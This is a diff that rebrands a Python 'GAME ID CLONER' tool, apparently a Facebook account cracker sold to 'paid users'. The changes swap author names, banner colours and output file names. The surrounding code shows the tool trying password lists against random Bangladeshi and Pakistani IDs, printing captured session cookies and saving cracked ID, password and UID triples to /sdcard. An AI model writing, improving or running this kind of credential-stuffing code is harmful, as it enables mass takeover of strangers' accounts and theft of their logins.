@@ -4,7 +4,7 @@
 #---------------------[IMPORT]---------------------#
 from os import path
 import os,base64,zlib,pip,urllib
-print('\n\033[1;37m install modules....\n It will take some seconds...JAR   W8 update Tool..')
+print('\n\033[1;37m install modules....\n It will take some seconds...xemon   W8 update Tool..')
 os.system('xdg-open https://www.facebook.com/djpagladirector?mibextid=ZbWKwL')
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -212,11 +212,11 @@ def psb(z):
         
 os.system("clear")
 import requests,os
-fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]ENTER YOUR NAME :\033[1;97m "))
+fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m] what is your name :\033[1;97m "))
 name=fuckx.upper()
 print ('')
 
-psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME MY TOOLS  '+name)
+psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mweelcame xemon tool 🔥  '+name)
 print('')
 print('\033[1;93mTOOLS UPDATE SUCCESSFUL ')
 print('')
@@ -253,13 +253,13 @@ def banner():
 ▪▐█·█▌▐█▄▄▌██ ██▌▐█▌▐█▌.▐▌██▐█▌
 •▀▀ ▀▀ ▀▀▀ ▀▀  █▪▀▀▀ ▀█▄▀▪▀▀ █▪
 
-\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
-\033[1;37m│ ❲★❳ AUTHOR   : EMON KHAN       │ 
-\033[1;37m│ ❲★❳ GITHUB   : PRIVATE            |
-\033[1;37m│ ❲★❳ WHATSAPP : +88 01867850909        │
-\033[1;37m│ ❲★❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
-\033[1;37m│ ❲★❳ VERSION  : \033[1;35m 10\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
-\033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
+\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┐
+\033[1;91m│ ❲★❳ AUTHOR   : Xemon       
+\033[1;32m│ ❲★❳ GITHUB   : PRIVATE            
+\033[1;91m│ ❲★❳ WHATSAPP : +88 018******9        
+\033[1;32m│ ❲★❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m                         
+\033[1;91m│ ❲★❳ VERSION  :   \033[1;35m     10                                                                              
+\033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┘""")
 #---------------------[LOOP MENU]---------------------#
 def linex():
         print(50*'_')
@@ -318,13 +318,13 @@ def main():
     #ip = requests.get("https://api.ipify.org").text
     #jalan("\033[97;1m[\033[92;1m+\033[97;1m]\033[97;1mIP ADDRES \033[38;5;196m: \033[1;32m"+ip)
     print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-    print(f"\033[1;97m[\033[92;1m1\033[1;97m]\033[1;97mRANDOM BD CLONE APK ")
-    print(f"\033[1;97m[\033[92;1m2\033[1;97m]\033[1;97mRANDOM BD CLONE OKS ")
-    print(f"\033[1;97m[\033[92;1m3\033[1;97m]\033[1;97mRANDOM BD CLONE MIX ")
-    print(f"\033[1;97m[\033[92;1m4\033[1;97m]\033[1;97mRANDOM CLONING  Email ") 
-    print(f"\033[1;97m[\033[92;1m5\033[1;97m]\033[1;97mRANDOM PK CLONE  ")
-    print(f"\033[1;97m[\033[92;1m6\033[1;97m]\033[1;97mCONTACT TO ADMIN  ")
-    print(f"\033[1;97m[\033[92;1m7\033[1;97m]\033[1;91mEXIT  ")
+    print(f"\033[1;97m[\033[92;1m1\033[1;93m]\033[1;93mRANDOM BD CLONE APK ")
+    print(f"\033[1;97m[\033[92;1m2\033[1;91m]\033[1;91mRANDOM BD CLONE OKS ")
+    print(f"\033[1;97m[\033[92;1m3\033[1;93m]\033[1;93mRANDOM BD CLONE MIX ")
+    print(f"\033[1;97m[\033[92;1m4\033[1;91m]\033[1;91mRANDOM CLONING  Email ") 
+    print(f"\033[1;97m[\033[92;1m5\033[1;93m]\033[1;93mRANDOM PK CLONE  ")
+    print(f"\033[1;97m[\033[92;1m6\033[1;91m]\033[1;91mCONTACT TO ADMIN  ")
+    print(f"\033[1;97m[\033[92;1m7\033[1;93m]\033[1;93mEXIT  ")
     print("")
 
     sh = input("\033[0;97m[\033[38;5;208m?\033[0;97m]\033[0;97mCHOOSE : ")
@@ -398,8 +398,8 @@ def random_apk():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -443,8 +443,8 @@ def random_MIX():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -490,8 +490,8 @@ def random_number1():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -535,8 +535,8 @@ def random_number2():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -580,8 +580,8 @@ def random_number3():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : xemon-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -694,7 +694,7 @@ def apk(uid,pwx,tl):
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/xemon-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                
                 break
             else:
@@ -714,7 +714,7 @@ def mix(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[EMON] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[xemon🔹] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -758,7 +758,7 @@ def mix(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[xemon🔸] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        # sys.stdout.write(f" \r{R} [{B}xemon🔸🔹{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
